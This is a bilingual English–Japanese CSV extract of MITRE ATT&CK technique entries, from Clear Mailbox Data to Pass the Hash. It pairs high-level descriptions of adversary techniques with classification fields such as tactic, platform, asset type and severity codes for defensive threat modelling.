T1070.008,T1070,Clear Mailbox Data,メールボックスデータの消去,"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code> or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page) Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",攻撃者は、自身の活動の証拠を消去するためにメールおよびメールアプリケーションデータを改変する可能性があります。メールアプリケーションでは、ユーザーや他のプログラムがコマンドラインツールやAPIを使用してメールボックスデータをエクスポートまたは削除できます。メールアプリケーションデータには、メール本文、メールメタデータ、またはエクスポート要求などのアプリケーションやOSが生成するログが含まれます。 攻撃者は、[フィッシング](https://attack.mitre.org/techniques/T1566)/[内部標的型フィッシング](https://attack.mitre.org/techniques/T1534)の証拠など、ログ、アーティファクト、メタデータを削除するためにメールやメールボックスデータを操作する可能性がある。 [メール収集](https://attack.mitre.org/techniques/T1114)、 コマンド＆コントロール用の[メールプロトコル](https://attack.mitre.org/techniques/T1071/003)、あるいは[代替プロトコル経由の情報漏洩](https://attack.mitre.org/techniques/T1048)などのメールベースの情報漏洩の証拠を消去する可能性があります。 例えば、Exchangeサーバー上の証拠を消去するために、攻撃者は<code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)モジュールを使用しており、<code>Remove-MailboxExportRequest</code>コマンドでメールボックスエクスポートの痕跡を消去しています。(引用元: Volexity SolarWinds)(引用元: ExchangePowerShell Module) Linux および macOS では、攻撃者は <code>mail</code> というコマンドラインユーティリティを使用してメールを削除したり、[AppleScript](https://attack.mitre.org/techniques/T1059/002) を使用して macOS の API とやり取りしたりすることもあります。(引用元: Cybereason Cobalt Kitty 2017)(引用元: mailx manページ) 攻撃者は、セキュリティ製品による悪意のあるメールの検出確率を下げるため、スパムや不審な活動を示すメールやメタデータ/ヘッダーを削除することもあります（例: 組織全体の転送ルールを使用）。(引用元: Microsoft OAuth Spam 2022),defense-evasion,Linux;macOS;Windows;Office Suite,script_command_execution,stealth,authentication_system;identity_federation;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--438c967d-3996-4870-bfc2-3954752a1927,2022-07-08T21:04:03.739Z,2025-04-15T21:56:59.810Z,,,,
T1070.009,T1070,Clear Persistence,持続性の消去,"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022) In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)",敵対者は、ホストシステム上で以前に確立した永続性に関連する痕跡を消去し、自らの活動の証拠を消去する場合があります。 これには、サービスの削除、実行ファイルの削除、[レジストリの変更](https://attack.mitre.org/techniques/T1112)、[Plist ファイルの変更](https://attack.mitre.org/techniques/T1647)、その他のクリーンアップ手法など、防御側が持続的な存在の証拠を収集できないようにするための様々なアクションが含まれる。(引用元: Cylance Dust Storm) また、持続性を維持するために事前に作成したアカウントを削除する場合もある（例: [アカウント作成](https://attack.mitre.org/techniques/T1136)）。(引用元: Talos - Cisco Attack 2022) 場合によっては、攻撃者の永続化が実行された後、新たなマルウェアインスタンスのエラーを防止するため、永続化の痕跡が除去されることもある。(引用元: NCC Group Team9 June 2020),defense-evasion,Linux;macOS;Windows;ESXi,config_policy_manipulation,stealth,authentication_system;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d2c4e5ea-dbdf-4113-805a-b1e2a337fb33,2022-07-29T19:32:11.552Z,2025-04-16T20:37:21.515Z,,,,
T1070.010,T1070,Relocate Malware,マルウェアの再配置,"Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts. Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: DFIR Report Trickbot June 2023) Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation: Latrodectus APR 2024) Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204) and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated alerts or otherwise drawn attention from defenders.",ペイロードが配信されると、攻撃者は被害者システム上に同一マルウェアの複製を生成し、自身の存在痕跡を消去したり防御策を回避したりすることがある。マルウェアペイロードを新規場所にコピーする行為は、古い痕跡を消去するための[ファイル削除](https://attack.mitre.org/techniques/T1070/004)と組み合わされる場合もある。マルウェアの再配置は、防御策回避を目的とした多くの行動の一部となり得る。 例えば、攻撃者はペイロードをコピーして名前を変更し、ローカル環境に溶け込ませる（すなわち、[正当なリソース名または場所との一致](https://attack.mitre.org/techniques/T1036/005)）場合があります。(引用元: DFIR Report Trickbot June 2023) ペイロードは、[ファイル/パスの除外設定](https://attack.mitre.org/techniques/T1564/012) や、[永続化](https://attack.mitre.org/tactics/TA0003) の確立に関連する特定の場所を標的とするために再配置される場合もあります。(引用元: Latrodectus APR 2024) 悪意のあるペイロードの再配置は、防御分析を妨げる可能性もあります。特に、アラートを生成したり防御担当者の注意を引いたりした可能性のある過去のイベント（[ユーザー実行](https://attack.mitre.org/techniques/T1204) や [フィッシング](https://attack.mitre.org/techniques/T1566) など）からこれらのペイロードを分離することが困難になる場合があります。,defense-evasion,Linux;macOS;Windows;Network Devices,other,stealth,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--cc36eeae-2209-4e63-89d3-c97e19edf280,2024-05-31T11:07:57.406Z,2025-04-15T19:59:08.329Z,,,,
T1071,,Application Layer Protocol,アプリケーション層プロトコル,"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22)",攻撃者は、既存のトラフィックに紛れ込むことで検知やネットワークフィルタリングを回避するため、OSIアプリケーション層プロトコルを使用して通信する場合があります。リモートシステムへのコマンド、そして多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。攻撃者は、ウェブブラウジング、ファイル転送、電子メール、DNS、またはパブリッシュ/サブスクライブに使用されるものを含む、多くの異なるプロトコルを利用する場合があります。 エンクレーブ内部で発生する接続（プロキシやピボットノードと他のノード間の接続など）では、一般的に使用されるプロトコルはSMB、SSH、またはRDPである。（引用元：Mandiant APT29 Eye Spy Email Nov 22）,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,remote_service_abuse,remote_control,user_interaction;endpoint_execution;network_connectivity;email_infrastructure;file_storage_access,specified,Business Workstation;File Server;Mail / Collaboration;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6,2017-05-31T21:30:56.776Z,2025-04-15T19:58:21.401Z,,,,
T1071.001,T1071,Web Protocols,Webプロトコル,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",攻撃者は、既存のトラフィックに紛れ込むことで検知やネットワークフィルタリングを回避するため、Webトラフィックに関連するアプリケーション層プロトコルを使用して通信する場合がある。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれる。Webトラフィックを伝送するHTTP/S（引用元：CrowdStrike Putter Panda）やWebSocket（引用元：Brazking-Websockets）などのプロトコルは、環境内で非常に一般的である可能性がある。 HTTP/Sパケットにはデータを隠蔽可能な多数のフィールドとヘッダーが存在します。攻撃者はこれらのプロトコルを悪用し、被害者ネットワーク内の支配下システムと通信しつつ、正常な想定トラフィックを模倣することが可能です。,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,remote_control,authentication_system;endpoint_execution;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161,2020-03-15T16:13:46.151Z,2025-04-15T19:59:14.227Z,,,,
T1071.002,T1071,File Transfer Protocols,ファイル転送プロトコル,"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments. Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",攻撃者は、既存のトラフィックに紛れ込むことで検知やネットワークフィルタリングを回避し、ファイル転送に関連するアプリケーション層プロトコルを使用して通信を行う可能性があります。リモートシステムへのコマンド、そして多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。SMB(出典: US-CERT TA18-074A)、FTP(引用元: ESET Machete 2019年7月)、FTPS、TFTPなどのファイル転送プロトコルは、環境内で非常に一般的である可能性がある。これらのプロトコルから生成されるパケットには、データを隠蔽できる多くのフィールドやヘッダーが含まれる可能性がある。データは転送されるファイル内に隠蔽される可能性もある。攻撃者は、被害者ネットワーク内の自身の制御下にあるシステムと通信するためにこれらのプロトコルを悪用すると同時に、正常で予想されるトラフィックを模倣する可能性がある。,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,remote_service_abuse,remote_control,authentication_system;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b,2020-03-15T16:16:25.763Z,2025-04-15T19:58:52.946Z,,,,
T1071.003,T1071,Mail Protocols,メールプロトコル,"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments. Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: FireEye APT28)",攻撃者は、電子メール配信に関連するアプリケーション層プロトコルを使用して通信し、既存のトラフィックに紛れ込むことで検知やネットワークフィルタリングを回避する可能性があります。リモートシステムへのコマンド、そして多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。電子メールを伝送するSMTP/S、POP3/S、IMAPなどのプロトコルは、環境内で非常に一般的である可能性があります。 これらのプロトコルから生成されるパケットには、データを隠蔽できる多数のフィールドやヘッダーが存在する場合がある。データは電子メールメッセージ自体にも隠蔽される可能性がある。攻撃者は、被害者ネットワーク内の自らが制御するシステムと通信する際にこれらのプロトコルを悪用し、同時に通常の予期されるトラフィックを模倣することがある。（引用元：FireEye APT28）,command-and-control,Linux;macOS;Windows;Network Devices,script_command_execution,remote_control,authentication_system;user_interaction;endpoint_execution;network_connectivity;email_infrastructure,specified,Business Workstation;Mail / Collaboration;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b,2020-03-15T16:21:45.131Z,2025-04-15T19:58:32.320Z,,,,
T1071.004,T1071,DNS,DNS,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)",攻撃者は、既存のトラフィックに紛れ込むことで検知/ネットワークフィルタリングを回避するため、ドメインネームシステム（DNS）アプリケーション層プロトコルを使用して通信する場合があります。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。DNSプロトコルはコンピュータネットワークにおいて管理機能を果たすため、環境内で非常に一般的である可能性があります。 DNSトラフィックは、ネットワーク認証が完了する前であっても許可される場合がある。DNSパケットにはデータを隠蔽可能な多数のフィールドやヘッダーが含まれる。DNSトンネリングとして知られる手法で、攻撃者はDNSを悪用し、被害者ネットワーク内の支配下システムと通信しながら、通常の想定されるトラフィックを模倣することがある。（出典：PAN DNS Tunneling）（出典：Medium DnsTunneling）,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,remote_control,authentication_system;endpoint_execution;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72,2020-03-15T16:27:31.768Z,2025-04-15T19:58:10.065Z,,,,
T1071.005,T1071,Publish/Subscribe Protocols,パブリッシュ/サブスクライブプロトコル,"Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as <code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>, and <code>STOMP</code> use a publish/subscribe design, with message distribution managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation: Mandiant APT1 Appendix) Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics.(Citation: wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.",攻撃者は、既存のトラフィックに紛れ込むことで検知やネットワークフィルタリングを回避するため、パブリッシュ/サブスクライブ（pub/sub）アプリケーション層プロトコルを使用して通信することがあります。リモートシステムへのコマンド、そして多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。 <code>MQTT</code>、<code>XMPP</code>、<code>AMQP</code>、<code>STOMP</code>などのプロトコルはパブリッシュ/サブスクライブ設計を採用し、メッセージ配信は中央集権的なブローカーによって管理される。(引用: wailing crab sub/pub)(引用: Mandiant APT1 Appendix) 発行者はメッセージをトピックで分類し、購読者は購読したトピックに基づいてメッセージを受信する。(引用元: wailing crab sub/pub) 攻撃者は、メッセージブローカーの背後から、自身の制御下にあるシステムと通信するためにパブリッシュ/サブスクライブプロトコルを悪用すると同時に、正常で予想されるトラフィックを模倣することも可能です。,command-and-control,macOS;Linux;Windows;Network Devices,script_command_execution,remote_control,authentication_system;endpoint_execution;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--241f9ea8-f6ae-4f38-92f5-cef5b7e539dd,2024-08-28T14:14:18.512Z,2025-04-15T19:58:14.152Z,,,,
T1072,,Software Deployment Tools,ソフトウェア導入ツール,"Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager. Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. SaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan) Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation) The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",攻撃者は、企業内にインストールされた集中管理型ソフトウェアスイートにアクセスし、コマンドを実行したりネットワーク内を横方向に移動したりするために利用する可能性があります。構成管理およびソフトウェア展開アプリケーションは、日常的な管理目的で企業ネットワークやクラウド環境で使用される場合があります。これらのシステムはCI/CDパイプラインに統合されることもあります。このようなソリューションの例としては、SCCM、HBSS、Altiris、AWS Systems Manager、Microsoft Intune、Azure Arc、GCP Deployment Managerなどが挙げられます。 ネットワーク全体または企業全体のエンドポイント管理ソフトウェアへのアクセスにより、攻撃者は接続された全システムでリモートコード実行を実現できる可能性があります。このアクセスは、他のシステムへの横方向移動、情報収集、または全エンドポイントのハードドライブ消去といった特定の効果を引き起こすために利用される可能性があります。 SaaSベースの構成管理サービスは、クラウドホスト型インスタンスに対する広範な[クラウド管理コマンド](https://attack.mitre.org/techniques/T1651)や、オンプレミスエンドポイントでの任意コマンド実行を可能にする場合があります。例えばMicrosoft Configuration Managerでは、グローバル管理者またはIntune管理者が、Entra IDに参加したオンプレミスデバイス上でSYSTEM権限でスクリプトを実行できます。(引用元: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) このようなサービスは、敵対者が所有するインフラへの通信に[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)を利用する場合もある。(引用元: Mitiga Security Advisory: SSM Agent as Remote Access Trojan) ネットワークインフラデバイスには構成管理ツールが搭載されている場合があり、これらは同様に攻撃者に悪用される可能性があります。(引用元: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation) この操作に必要な権限はシステム構成によって異なります。サードパーティシステムへの直接アクセスにはローカル認証情報のみで十分な場合もあれば、特定のドメイン認証情報が必要な場合もあります。 ただし、システムによっては、ログインや特定の機能へのアクセスに管理者アカウントが必要になる場合があります。,execution;lateral-movement,Linux;macOS;Windows;Network Devices;SaaS,credential_abuse,boundary_crossing,authentication_system;privileged_account;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;saas_in_use;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0008,attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414,2017-05-31T21:30:57.201Z,2025-04-15T19:58:51.465Z,,,,
T1073,,DLL Side-Loading,DLL サイドローディング,"Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014) Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.",プログラムは実行時にロードされるDLLを指定する場合がある。必要なDLLを不適切または曖昧に指定するプログラムは、意図しないDLLがロードされる脆弱性のリスクに晒される。サイドローディング脆弱性は特に、Windows Side-by-Side (WinSxS) マニフェスト（引用元：MSDN Manifests）がロード対象DLLの特性を十分に明示していない場合に発生する。 攻撃者は、サイドローディングに脆弱な正当なプログラムを悪用して悪意のあるDLLをロードする可能性があります（出典：Stewart 2014）。攻撃者は、正当で信頼されたシステムやソフトウェアプロセス下で実行する動作を隠蔽する手段として、この手法を利用する可能性が高いです。,defense-evasion,Windows,other,stealth,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b2001907-166b-4d71-bb3c-9d26c871de09,2017-05-31T21:30:58.007Z,2025-04-25T15:16:00.228Z,,,,
T1074,,Data Staged,データのステージング,"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017) In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020) Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",攻撃者は、データ漏洩前に収集したデータを一元的な場所やディレクトリにステージングする可能性があります。データは別々のファイルに保持されるか、[収集データのアーカイブ](https://attack.mitre.org/techniques/T1560)などの手法で単一ファイルに統合される場合があります。 対話型コマンドシェルが使用される場合があり、[cmd](https://attack.mitre.org/software/S0106) や bash の一般的な機能を使用して、データをステージング場所にコピーすることができます。(引用元: PWC Cloud Hopper 2017年4月) クラウド環境では、敵対者は、データ漏洩の前に、特定のインスタンスまたは仮想マシン内にデータをステージングする場合があります。 攻撃者は[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、そのインスタンス内にデータをステージングする場合がある。(引用元: Mandiant M-Trends 2020) 攻撃者は、C2サーバーへの接続回数を最小限に抑え、検知回避を強化するため、データ漏洩前に被害者ネットワークからのデータを集中管理場所にステージングすることを選択する可能性がある。,collection,Windows;IaaS;Linux;macOS;ESXi,script_command_execution,asset_access,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e,2017-05-31T21:30:58.938Z,2025-04-15T19:58:45.225Z,,,,
T1074.001,T1074,Local Data Staging,ローカルデータステージング,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location. Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",攻撃者は、データ漏洩前に収集したデータをローカルシステム上の中央の場所やディレクトリに一時保存する場合がある。データは個別のファイルに保持されるか、[収集データのアーカイブ](https://attack.mitre.org/techniques/T1560)などの手法で単一ファイルに統合される。 対話型コマンドシェルが使用される場合があり、[cmd](https://attack.mitre.org/software/S0106) や bash の一般的な機能を利用してデータをステージング場所にコピーすることがある。攻撃者はまた、ローカルストレージデータベース/リポジトリや Windows レジストリなど、システム内の様々な利用可能な形式/場所に収集データをステージングする場合がある。(引用元: Prevailion DarkWatchman 2021),collection,Linux;Windows;macOS;ESXi,script_command_execution,asset_access,authentication_system;endpoint_execution;file_storage_access;database_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c,2020-03-13T21:13:10.467Z,2025-04-15T19:58:11.270Z,,,,
T1074.002,T1074,Remote Data Staging,リモートデータステージング,"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location. In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020) By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",攻撃者は、複数のシステムから収集したデータを、漏洩前に単一システム上の中央ロケーションまたはディレクトリにステージングする場合がある。データは別々のファイルに保持されるか、[収集データのアーカイブ](https://attack.mitre.org/techniques/T1560)などの手法で単一ファイルに統合される。 対話型コマンドシェルが使用される場合があり、[cmd](https://attack.mitre.org/software/S0106) や bash の共通機能を利用してデータをステージング場所にコピーすることがある。クラウド環境では、攻撃者はデータ漏洩前に特定のインスタンスや仮想マシン内にデータをステージングする場合がある。 攻撃者は[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、そのインスタンス内にデータをステージングすることがあります。(引用元: Mandiant M-Trends 2020) データ漏洩前に1つのシステムにデータをステージングすることで、攻撃者はC2サーバーへの接続回数を最小限に抑え、検知回避を強化できます。,collection,Windows;IaaS;Linux;macOS;ESXi,script_command_execution,asset_access,authentication_system;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0,2020-03-13T21:14:58.206Z,2025-04-15T19:58:21.613Z,,,,
T1075,,Pass the Hash,ハッシュパス,"Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting)",ハッシュ渡し（PtH）とは、ユーザーの平文パスワードにアクセスせずにユーザーとして認証する手法である。この手法は平文パスワードを必要とする標準的な認証ステップを迂回し、パスワードハッシュを使用する認証段階に直接移行する。 この手法では、クレデンシャルアクセステクニックを用いて、使用対象アカウントの有効なパスワードハッシュをキャプチャする。キャプチャしたハッシュをPtHと組み合わせて、そのユーザーとして認証を行う。認証後、PtHを用いてローカルまたはリモートシステム上で操作を実行できる。Windows 7以降でKB2871997を適用している場合、有効なドメインユーザー資格情報またはRID 500管理者ハッシュが必要となる。（引用元：NSA Spotting）,lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;privileged_account;user_interaction;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--c23b740b-a42b-47a1-aec2-9d48ddd547ff,2017-05-31T21:30:59.339Z,2025-04-25T15:16:06.830Z,,,,
